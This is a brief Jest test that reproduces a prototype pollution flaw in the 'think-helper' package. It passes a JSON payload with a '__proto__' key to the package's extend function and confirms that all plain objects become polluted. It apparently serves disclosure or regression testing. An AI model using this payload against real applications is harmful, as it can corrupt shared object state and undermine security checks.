//
test("prototype pollution in think-helper", () => {
  const a = require("think-helper");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  a.extend(obj, JSON.parse('{"__proto__":{"polluted":"yes"}}'));

  expect({}.polluted).toBe("yes");
});
